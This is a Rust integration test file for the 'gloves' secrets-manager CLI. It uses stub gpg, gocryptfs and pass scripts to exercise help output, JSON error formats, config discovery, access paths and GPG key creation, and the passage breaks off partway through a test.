use assert_cmd::Command;
use chrono::{DateTime, Utc};

use std::{
    fs,
    io::{BufRead, BufReader, Read, Write},
    net::{TcpListener, TcpStream},
    path::Path,
    process::Stdio,
    sync::{Mutex, MutexGuard},
    time::Duration,
};

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

const DAEMON_WAIT_ATTEMPTS: usize = 100;
const DAEMON_WAIT_STEP_MILLIS: u64 = 20;
const GRANT_MATRIX_PASS_COUNT: usize = 10;
const GET_PIPE_ALLOWLIST_ENV_VAR: &str = "GLOVES_GET_PIPE_ALLOWLIST";
const GET_PIPE_ARG_POLICY_ENV_VAR: &str = "GLOVES_GET_PIPE_ARG_POLICY";
const GET_PIPE_URL_POLICY_ENV_VAR: &str = "GLOVES_GET_PIPE_URL_POLICY";
const REQUEST_ALLOWLIST_ENV_VAR: &str = "GLOVES_REQUEST_ALLOWLIST";
const REQUEST_BLOCKLIST_ENV_VAR: &str = "GLOVES_REQUEST_BLOCKLIST";
const SUGGEST_AUTORUN_ENV_VAR: &str = "GLOVES_SUGGEST_AUTORUN";
const TEST_PIPE_COMMAND: &str = "cat";
const ACL_TEST_AGENT_MAIN: &str = "agent-main";
const ACL_TEST_SECRET_GITHUB_TOKEN: &str = "github/token";
const ACL_TEST_REASON: &str = "acl coverage";
#[cfg(unix)]
const TEST_GPG_FINGERPRINT: &str = "0123456789ABCDEF0123456789ABCDEF01234567";
static DAEMON_TEST_LOCK: Mutex<()> = Mutex::new(());

fn daemon_test_guard() -> MutexGuard<'static, ()> {
    match DAEMON_TEST_LOCK.lock() {
        Ok(guard) => guard,
        Err(poisoned) => poisoned.into_inner(),
    }
}

fn connect_with_retry(address: &str) -> TcpStream {
    for _ in 0..DAEMON_WAIT_ATTEMPTS {
        if let Ok(stream) = TcpStream::connect(address) {
            return stream;
        }
        std::thread::sleep(Duration::from_millis(DAEMON_WAIT_STEP_MILLIS));
    }
    panic!("daemon endpoint was not reachable in time: {address}");
}

fn reserve_loopback_port() -> u16 {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    drop(listener);
    port
}

fn spawn_daemon_with_retry(root: &Path, max_requests: usize) -> (std::process::Child, String) {
    spawn_daemon_with_retry_and_env(root, max_requests, &[])
}

fn spawn_daemon_with_retry_and_env(
    root: &Path,
    max_requests: usize,
    env_pairs: &[(&str, &str)],
) -> (std::process::Child, String) {
    let binary = assert_cmd::cargo::cargo_bin!("gloves");
    let root = root.to_str().unwrap();
    let mut last_bind_error = String::new();

    for _ in 0..DAEMON_WAIT_ATTEMPTS {
        let bind = format!("127.0.0.1:{}", reserve_loopback_port());
        let mut command = std::process::Command::new(binary);
        command.args([
            "--root",
            root,
            "daemon",
            "--bind",
            &bind,
            "--max-requests",
            &max_requests.to_string(),
        ]);
        for (key, value) in env_pairs {
            command.env(key, value);
        }
        let mut child = command
            .stdout(Stdio::null())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();

        std::thread::sleep(Duration::from_millis(DAEMON_WAIT_STEP_MILLIS));
        match child.try_wait().unwrap() {
            Some(_status) => {
                let mut stderr = String::new();
                if let Some(mut pipe) = child.stderr.take() {
                    let _ = pipe.read_to_string(&mut stderr);
                }
                if stderr.contains("Address already in use") {
                    last_bind_error = stderr;
                    continue;
                }
                panic!("daemon failed to start: {stderr}");
            }
            None => return (child, bind),
        }
    }

    panic!(
        "failed to spawn daemon after retries; last error: {}",
        last_bind_error
    );
}

fn write_config(path: &Path, body: &str) {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).unwrap();
    }
    fs::write(path, body).unwrap();
    #[cfg(unix)]
    {
        let mut permissions = fs::metadata(path).unwrap().permissions();
        permissions.set_mode(0o600);
        fs::set_permissions(path, permissions).unwrap();
    }
}

fn toml_string_array(values: &[&str]) -> String {
    let quoted = values
        .iter()
        .map(|value| format!("\"{value}\""))
        .collect::<Vec<_>>();
    format!("[{}]", quoted.join(", "))
}

fn write_secret_acl_config(
    path: &Path,
    root: &Path,
    agent: &str,
    paths: &[&str],
    operations: &[&str],
) {
    let content = format!(
        "version = 1\n[paths]\nroot = \"{}\"\n[secrets.acl.{agent}]\npaths = {}\noperations = {}\n",
        root.display(),
        toml_string_array(paths),
        toml_string_array(operations),
    );
    write_config(path, &content);
}

fn write_pipe_url_policy_config(
    path: &Path,
    root: &Path,
    command: &str,
    require_url: bool,
    url_prefixes: &[&str],
) {
    let content = format!(
        "version = 1\n[paths]\nroot = \"{}\"\n[secrets.pipe.commands.{command}]\nrequire_url = {require_url}\nurl_prefixes = {}\n",
        root.display(),
        toml_string_array(url_prefixes),
    );
    write_config(path, &content);
}

fn first_pending_request_id(root: &Path) -> String {
    let pending_path = root.join("pending.json");
    let pending: serde_json::Value =
        serde_json::from_slice(&std::fs::read(pending_path).unwrap()).unwrap();
    pending[0]["id"].as_str().unwrap().to_owned()
}

#[cfg(unix)]
fn write_executable(path: &Path, body: &str) {
    fs::write(path, body).unwrap();
    let mut permissions = fs::metadata(path).unwrap().permissions();
    permissions.set_mode(0o755);
    fs::set_permissions(path, permissions).unwrap();
}

#[cfg(unix)]
fn install_fake_vault_binaries(bin_dir: &Path) {
    fs::create_dir_all(bin_dir).unwrap();

    write_executable(
        &bin_dir.join("gocryptfs"),
        r#"#!/usr/bin/env bash
set -euo pipefail
extpass=""
previous=""
for arg in "$@"; do
  if [[ "$previous" == "-extpass" ]]; then
    extpass="$arg"
  fi
  previous="$arg"
done
if [[ -n "$extpass" ]]; then
  read -r -a extpass_parts <<< "$extpass"
  "${extpass_parts[@]}" > /dev/null
fi
if [[ "$1" == "-init" ]]; then
  cipher=""
  for arg in "$@"; do
    cipher="$arg"
  done
  /bin/mkdir -p "$cipher"
  /usr/bin/touch "$cipher/gocryptfs.conf"
  exit 0
fi
mountpoint=""
for arg in "$@"; do
  mountpoint="$arg"
done
/bin/mkdir -p "$mountpoint"
/usr/bin/touch "$mountpoint/.mounted"
"#,
    );
    write_executable(
        &bin_dir.join("fusermount"),
        r#"#!/usr/bin/env bash
set -euo pipefail
if [[ "$1" == "-u" ]]; then
  /bin/rm -f "$2/.mounted"
fi
"#,
    );
    write_executable(
        &bin_dir.join("mountpoint"),
        r#"#!/usr/bin/env bash
set -euo pipefail
if [[ "$1" != "-q" ]]; then
  exit 2
fi
if [[ -f "$2/.mounted" ]]; then
  exit 0
fi
exit 1
"#,
    );
    write_executable(
        &bin_dir.join("pass"),
        r#"#!/usr/bin/env bash
set -euo pipefail
if [[ "$1" == "show" ]]; then
  printf 'dummy-pass-value'
fi
"#,
    );
}

#[cfg(unix)]
fn install_fake_vault_binaries_with_extpass_agent_log(bin_dir: &Path) {
    install_fake_vault_binaries(bin_dir);
    write_executable(
        &bin_dir.join("gocryptfs"),
        r#"#!/usr/bin/env bash
set -euo pipefail
extpass=""
previous=""
for arg in "$@"; do
  if [[ "$previous" == "-extpass" ]]; then
    extpass="$arg"
  fi
  previous="$arg"
done
if [[ -n "$extpass" ]]; then
  if [[ -n "${GLOVES_TEST_EXTPASS_AGENT_LOG:-}" ]]; then
    printf '%s\n' "${GLOVES_EXTPASS_AGENT:-}" > "${GLOVES_TEST_EXTPASS_AGENT_LOG}"
  fi
  read -r -a extpass_parts <<< "$extpass"
  if ! "${extpass_parts[@]}" > /dev/null; then
    :
  fi
fi
if [[ "$1" == "-init" ]]; then
  cipher=""
  for arg in "$@"; do
    cipher="$arg"
  done
  /bin/mkdir -p "$cipher"
  /usr/bin/touch "$cipher/gocryptfs.conf"
  exit 0
fi
mountpoint=""
for arg in "$@"; do
  mountpoint="$arg"
done
/bin/mkdir -p "$mountpoint"
/usr/bin/touch "$mountpoint/.mounted"
"#,
    );
}

#[cfg(unix)]
fn install_fake_gpg_binary(bin_dir: &Path) {
    install_fake_gpg_binary_with_homedir_limit(bin_dir, None);
}

#[cfg(unix)]
fn install_fake_gpg_binary_with_homedir_limit(bin_dir: &Path, max_homedir_length: Option<usize>) {
    fs::create_dir_all(bin_dir).unwrap();
    let max_homedir_length = max_homedir_length.unwrap_or(0);
    write_executable(
        &bin_dir.join("gpg"),
        &format!(
            r#"#!/usr/bin/env bash
set -euo pipefail
homedir=""
mode=""
for ((index=1; index<=$#; index++)); do
  arg="${{!index}}"
  if [[ "$arg" == "--homedir" ]]; then
    next_index=$((index + 1))
    homedir="${{!next_index}}"
  elif [[ "$arg" == "--quick-generate-key" ]]; then
    mode="generate"
  elif [[ "$arg" == "--list-secret-keys" ]]; then
    mode="list"
  fi
done

if [[ -z "$homedir" ]]; then
  echo "missing --homedir" >&2
  exit 2
fi

if [[ {max_homedir_length} -gt 0 && ${{#homedir}} -gt {max_homedir_length} ]]; then
  echo "homedir too long: ${{#homedir}}" >&2
  exit 2
fi

mkdir -p "$homedir"
fingerprint_file="$homedir/fingerprint.txt"

if [[ "$mode" == "generate" ]]; then
  printf '{TEST_GPG_FINGERPRINT}' > "$fingerprint_file"
  exit 0
fi

if [[ "$mode" == "list" ]]; then
  if [[ ! -f "$fingerprint_file" ]]; then
    exit 0
  fi
  fingerprint="$(cat "$fingerprint_file")"
  printf 'sec:u:255:22:1234567890ABCDEF:1700000000::::::scESC:\n'
  printf 'fpr:::::::::%s:\n' "$fingerprint"
  exit 0
fi

echo "unsupported fake gpg invocation: $*" >&2
exit 2
"#,
        ),
    );
}

#[cfg(unix)]
fn with_fake_path(fake_bin: &Path) -> String {
    let current_path = std::env::var("PATH").unwrap_or_default();
    let gloves_bin = assert_cmd::cargo::cargo_bin!("gloves");
    let gloves_dir = gloves_bin.parent().unwrap();
    format!(
        "{}:{}:{}",
        fake_bin.display(),
        gloves_dir.display(),
        current_path
    )
}

#[cfg(unix)]
fn with_fake_path_and_gloves_only(fake_bin: &Path) -> String {
    let gloves_bin = assert_cmd::cargo::cargo_bin!("gloves");
    let gloves_dir = gloves_bin.parent().unwrap();
    format!("{}:{}", fake_bin.display(), gloves_dir.display())
}

#[test]
fn cli_init() {
    let temp_dir = tempfile::tempdir().unwrap();
    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--root", temp_dir.path().to_str().unwrap(), "init"])
        .assert()
        .success();

    assert!(temp_dir.path().join("store").exists());
    assert!(temp_dir.path().join("meta").exists());
}

#[test]
fn cli_version_flag_prints_installed_version() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .arg("--version")
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.trim().starts_with("gloves "));
    assert!(stdout.contains(env!("CARGO_PKG_VERSION")));
}

#[test]
fn cli_version_flag_respects_error_format_json() {
    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--error-format", "json", "--version"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["name"], "gloves");
    assert_eq!(payload["version"], env!("CARGO_PKG_VERSION"));
    assert_eq!(payload["default_root"], ".openclaw/secrets");
    assert_eq!(payload["default_agent"], "default-agent");
    assert!(payload["config_schema_version"].is_u64());
}

#[test]
fn cli_help_lists_tui_and_error_format_option() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .arg("--help")
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains("tui"));
    assert!(stdout.contains("--error-format"));
    assert!(stdout.contains("--json"));
}

#[test]
fn cli_help_command_index_hides_legacy_request_shortcuts() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .arg("--help")
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains("\n  requests "));
    assert!(stdout.contains("\n  secrets "));
    assert!(!stdout.contains("\n  approve "));
    assert!(!stdout.contains("\n  deny "));
    assert!(!stdout.contains("\n  set "));
    assert!(!stdout.contains("\n  get "));
    assert!(!stdout.contains("\n  grant "));
    assert!(!stdout.contains("\n  revoke "));
    assert!(!stdout.contains("\n  status "));
}

#[test]
fn cli_help_compacts_command_rows_on_one_line() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .arg("--help")
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains("  init"));
    assert!(stdout.contains("Initializes directory tree"));
    assert!(!stdout.contains("  init\n          Initializes directory tree"));
}

#[test]
fn cli_tui_accepts_bootstrap_args_before_command_path() {
    let temp_dir = tempfile::tempdir().unwrap();
    let config_path = temp_dir.path().join("prod.gloves.toml");
    write_config(
        &config_path,
        &format!(
            "version = 1\n[paths]\nroot = \"{}\"\n",
            temp_dir.path().join("root").display()
        ),
    );

    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "tui",
            "--config",
            config_path.to_str().unwrap(),
            "audit",
            "--limit",
            "100",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("requires an interactive terminal"));
    assert!(!stderr.contains("unexpected argument"));
}

#[test]
fn cli_version_flag_prints_helpful_metadata() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .arg("--version")
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains(&format!("gloves {}", env!("CARGO_PKG_VERSION"))));
    assert!(stdout.contains("config schema version:"));
    assert!(stdout.contains("default root:"));
    assert!(stdout.contains("default agent:"));
    assert!(stdout.contains("help: gloves --help"));
}

#[test]
fn cli_help_tui_includes_controls() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["help", "tui"])
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains("Startup:"));
    assert!(stdout.contains("auto-executed"));
    assert!(stdout.contains("fullscreen output view"));
    assert!(stdout.contains("Controls:"));
    assert!(stdout.contains("r or F5"));
    assert!(stdout.contains("/ : filter"));
    assert!(stdout.contains("collapse/expand command groups"));
    assert!(stdout.contains("in output they pan horizontally"));
    assert!(stdout.contains("Shift+Left/Shift+Right"));
    assert!(stdout.contains("Mouse wheel left/right (or Shift+wheel)"));
    assert!(stdout.contains("Mouse wheel up/down: vertical scroll in command tree and output pane"));
    assert!(stdout.contains("o or O: focus execution output pane"));
    assert!(stdout.contains("toggle fullscreen for focused pane"));
    assert!(stdout.contains(
        "split view cycles commands -> global flags -> command fields -> run -> commands"
    ));
    assert!(stdout.contains("fullscreen keeps current pane focus"));
    assert!(stdout.contains("? : run `gloves help`"));
    assert!(stdout.contains("Ctrl+C: cancel active run"));
    assert!(stdout.contains("Home or g"));
    assert!(stdout.contains("End or G"));
    assert!(stdout.contains("Esc: exit fullscreen and return focus to command tree"));
    assert!(stdout.contains("live streaming output"));
}

#[test]
fn cli_help_grant_includes_usage_examples() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["help", "secrets", "grant"])
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains("gloves secrets grant service/token --to agent-b"));
    assert!(stdout.contains("original creator of the secret"));
}

#[test]
fn cli_help_recursive_topic_path_renders_leaf_help() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["help", "requests", "approve"])
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains("USAGE:"));
    assert!(stdout.contains("gloves requests approve [OPTIONS] <REQUEST_ID>"));
    assert!(stdout.contains("Request UUID from `gloves requests list`"));
}

#[test]
fn cli_subcommand_help_renders_nested_leaf_help() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["requests", "help", "approve"])
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains("USAGE:"));
    assert!(stdout.contains("gloves requests approve [OPTIONS] <REQUEST_ID>"));
    assert!(stdout.contains("Request UUID from `gloves requests list`"));
}

#[test]
fn cli_help_legacy_shortcut_topic_still_works() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["help", "approve"])
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains("USAGE:"));
    assert!(stdout.contains("gloves approve [OPTIONS] <REQUEST_ID>"));
    assert!(stdout.contains("gloves requests approve <request-id>"));
}

#[test]
fn cli_help_output_uses_structured_headings() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["help"])
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    assert!(stdout.contains("USAGE:"));
    assert!(stdout.contains("COMMANDS:"));
    assert!(!stdout.contains("Usage:"));
}

#[test]
fn cli_error_format_json_reports_runtime_error_shape() {
    let temp_dir = tempfile::tempdir().unwrap();
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "--error-format",
            "json",
            "approve",
            "requests",
        ])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    let payload: serde_json::Value = serde_json::from_str(&stderr).unwrap();
    assert_eq!(payload["kind"], "runtime_error");
    assert_eq!(payload["code"], "E102");
    assert!(payload["message"].as_str().unwrap().contains("label"));
    assert_eq!(payload["explain"], "gloves explain E102");
}

#[test]
fn cli_error_format_json_reports_parse_error_shape() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--error-format", "json", "aproov"])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    let payload: serde_json::Value = serde_json::from_str(&stderr).unwrap();
    assert_eq!(payload["kind"], "parse_error");
    assert_eq!(payload["code"], "E001");
    assert_eq!(payload["suggestion"]["unknown"], "aproov");
    assert_eq!(payload["suggestion"]["suggested"], "approve");
}

#[test]
fn cli_error_format_json_applies_to_success_output() {
    let temp_dir = tempfile::tempdir().unwrap();
    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "--error-format",
            "json",
            "init",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["status"], "ok");
    assert_eq!(payload["command"], "init");
    assert_eq!(payload["result"]["message"], "initialized");
}

#[test]
fn cli_json_flag_alias_applies_to_success_output() {
    let temp_dir = tempfile::tempdir().unwrap();
    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--root",
            temp_dir.path().to_str().unwrap(),
            "--json",
            "init",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["status"], "ok");
    assert_eq!(payload["command"], "init");
    assert_eq!(payload["result"]["message"], "initialized");
}

#[test]
fn cli_error_format_json_applies_to_help_output() {
    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--error-format", "json", "help", "requests", "approve"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["status"], "ok");
    assert_eq!(payload["command"], "help");
    assert_eq!(payload["result"]["topic"], "requests approve");
    assert!(payload["result"]["content"]
        .as_str()
        .is_some_and(|content| content.contains("USAGE:")));
}

#[test]
fn cli_error_format_json_applies_to_help_flag_output() {
    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--error-format", "json", "--help"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["status"], "ok");
    assert_eq!(payload["command"], "help");
    assert_eq!(payload["result"]["topic"], "");
    assert!(payload["result"]["content"]
        .as_str()
        .is_some_and(|content| content.contains("Usage:")));
}

#[test]
fn cli_error_format_json_applies_to_version_flag_output() {
    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--error-format", "json", "--version"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["name"], "gloves");
    assert_eq!(payload["version"], env!("CARGO_PKG_VERSION"));
}

#[test]
fn cli_autorun_suggestion_executes_safe_command_when_enabled() {
    let temp_dir = tempfile::tempdir().unwrap();
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(SUGGEST_AUTORUN_ENV_VAR, "1")
        .args(["--root", temp_dir.path().to_str().unwrap(), "lits"])
        .assert()
        .success();
    let stdout = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stdout.contains("["));
    assert!(stderr.contains("auto-run: executing corrected command"));
}

#[test]
fn cli_autorun_suggestion_blocks_risky_command_by_default() {
    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env(SUGGEST_AUTORUN_ENV_VAR, "1")
        .args(["sett"])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("blocked because the command can mutate state"));
}

#[test]
fn cli_version_flag_json_is_machine_readable() {
    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args(["--error-format", "json", "--version"])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["name"], "gloves");
    assert_eq!(payload["version"], env!("CARGO_PKG_VERSION"));
    assert_eq!(payload["default_root"], ".openclaw/secrets");
    assert_eq!(payload["default_agent"], "default-agent");
    assert!(payload["config_schema_version"].is_u64());
}

#[test]
fn cli_bootstrap_uses_discovered_gloves_toml() {
    let temp_dir = tempfile::tempdir().unwrap();
    let workspace = temp_dir.path().join("workspace");
    let nested = workspace.join("nested/project");
    fs::create_dir_all(&nested).unwrap();

    let config_path = workspace.join(".gloves.toml");
    write_config(
        &config_path,
        r#"
version = 1

[paths]
root = "./runtime-from-config"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .current_dir(&nested)
        .args(["init"])
        .assert()
        .success();

    assert!(workspace.join("runtime-from-config/store").exists());
}

#[test]
fn cli_bootstrap_uses_explicit_config_path() {
    let temp_dir = tempfile::tempdir().unwrap();
    let workspace = temp_dir.path().join("workspace");
    let config_dir = temp_dir.path().join("configs");
    fs::create_dir_all(&workspace).unwrap();

    let config_path = config_dir.join("custom.gloves.toml");
    write_config(
        &config_path,
        r#"
version = 1

[paths]
root = "./explicit-root"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .current_dir(&workspace)
        .args(["--config", config_path.to_str().unwrap(), "init"])
        .assert()
        .success();

    assert!(config_dir.join("explicit-root/store").exists());
}

#[test]
fn cli_bootstrap_no_config_keeps_existing_defaults() {
    let temp_dir = tempfile::tempdir().unwrap();
    let workspace = temp_dir.path().join("workspace");
    fs::create_dir_all(&workspace).unwrap();
    write_config(
        &workspace.join(".gloves.toml"),
        r#"
version = 1

[paths]
root = "./should-not-be-used"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .current_dir(&workspace)
        .args(["--no-config", "init"])
        .assert()
        .success();

    assert!(workspace.join(".openclaw/secrets/store").exists());
    assert!(!workspace.join("should-not-be-used").exists());
}

#[test]
fn cli_config_validate_success() {
    let temp_dir = tempfile::tempdir().unwrap();
    let config_path = temp_dir.path().join(".gloves.toml");
    write_config(&config_path, "version = 1\n");

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "config",
            "validate",
        ])
        .assert()
        .success()
        .stdout(predicates::str::contains("ok"));
}

#[test]
fn cli_config_validate_required_fails_without_binaries() {
    let temp_dir = tempfile::tempdir().unwrap();
    let config_path = temp_dir.path().join(".gloves.toml");
    let empty_path = temp_dir.path().join("empty-path");
    fs::create_dir_all(&empty_path).unwrap();
    write_config(&config_path, "version = 1\n");

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", empty_path.to_str().unwrap())
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "--vault-mode",
            "required",
            "config",
            "validate",
        ])
        .assert()
        .failure()
        .stderr(predicates::str::contains("missing required binaries"));
}

#[test]
fn cli_config_validate_failure_invalid_alias() {
    let temp_dir = tempfile::tempdir().unwrap();
    let config_path = temp_dir.path().join(".gloves.toml");
    write_config(
        &config_path,
        r#"
version = 1

[private_paths]
"bad alias" = "./private"
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "config",
            "validate",
        ])
        .assert()
        .failure();
}

#[test]
fn cli_access_paths_without_config_fails() {
    let temp_dir = tempfile::tempdir().unwrap();

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .current_dir(temp_dir.path())
        .args(["access", "paths", "--agent", "default-agent"])
        .assert()
        .failure()
        .stderr(predicates::str::contains("no config loaded"));
}

#[test]
fn cli_access_paths_json() {
    let temp_dir = tempfile::tempdir().unwrap();
    let config_path = temp_dir.path().join(".gloves.toml");
    write_config(
        &config_path,
        r#"
version = 1

[private_paths]
runtime_root = "./runtime"

[agents.default-agent]
paths = ["runtime_root"]
operations = ["read", "list"]
"#,
    );

    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--json",
            "--config",
            config_path.to_str().unwrap(),
            "access",
            "paths",
            "--agent",
            "default-agent",
        ])
        .assert()
        .success();
    let output = String::from_utf8(assert.get_output().stdout.clone()).unwrap();
    let payload: serde_json::Value = serde_json::from_str(&output).unwrap();

    assert_eq!(payload["status"], "ok");
    assert_eq!(payload["command"], "access-paths");
    assert_eq!(payload["result"]["agent"], "default-agent");
    assert_eq!(payload["result"]["paths"][0]["alias"], "runtime_root");
}

#[test]
fn cli_access_paths_unknown_agent_fails() {
    let temp_dir = tempfile::tempdir().unwrap();
    let config_path = temp_dir.path().join(".gloves.toml");
    write_config(
        &config_path,
        r#"
version = 1

[private_paths]
runtime_root = "./runtime"

[agents.default-agent]
paths = ["runtime_root"]
operations = ["read"]
"#,
    );

    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .args([
            "--config",
            config_path.to_str().unwrap(),
            "access",
            "paths",
            "--agent",
            "agent-b",
        ])
        .assert()
        .failure();
}

#[cfg(unix)]
#[test]
fn cli_gpg_create_generates_fingerprint_and_audit_event() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_gpg_binary(&fake_bin);

    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root.to_str().unwrap(),
            "--agent",
            "agent-main",
            "gpg",
            "create",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let payload: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(payload["agent"], "agent-main");
    assert_eq!(payload["fingerprint"], TEST_GPG_FINGERPRINT);
    assert_eq!(payload["created"], true);

    let audit = fs::read_to_string(root.join("audit.jsonl")).unwrap();
    assert!(audit.contains("\"event\":\"gpg_key_created\""));
    assert!(audit.contains(TEST_GPG_FINGERPRINT));
}

#[cfg(unix)]
#[test]
fn cli_gpg_create_is_idempotent_for_existing_key() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let fake_bin = temp_dir.path().join("fake-bin");
    install_fake_gpg_binary(&fake_bin);
    let root_literal = root.to_str().unwrap();

    let first_output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root_literal,
            "--agent",
            "agent-main",
            "gpg",
            "create",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let first_payload: serde_json::Value = serde_json::from_slice(&first_output).unwrap();
    assert_eq!(first_payload["created"], true);

    let second_output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", with_fake_path(&fake_bin))
        .args([
            "--root",
            root_literal,
            "--agent",
            "agent-main",
            "gpg",
            "create",
        ])
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let second_payload: serde_json::Value = serde_json::from_slice(&second_output).unwrap();
    assert_eq!(second_payload["created"], false);
    assert_eq!(second_payload["fingerprint"], TEST_GPG_FINGERPRINT);

    let audit = fs::read_to_string(root.join("audit.jsonl")).unwrap();
    assert_eq!(audit.matches("\"event\":\"gpg_key_created\"").count(), 1);
}

#[test]
fn cli_gpg_create_requires_gpg_binary() {
    let temp_dir = tempfile::tempdir().unwrap();
    let root = temp_dir.path().join("secrets");
    let empty_path = temp_dir.path().join("empty-path");
    fs::create_dir_all(&empty_path).unwrap();

    let assert = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
        .env("PATH", empty_path.to_str().unwrap())
        .args(["--root", root.to_str().unwrap(), "gpg", "create"])
        .assert()
        .failure();
    let stderr = String::from_utf8(assert.get_output().stderr.clone()).unwrap();
    assert!(stderr.contains("required binary not found: gpg"));
    assert!(stderr.contains("install the missing runtime binary"));
}

#[cfg(unix)]
#[test]
fn cli_gpg_fingerprint_returns_not_found_when_key_is_missing() {
    let temp_dir = tempfile::tempdir().unwrap();
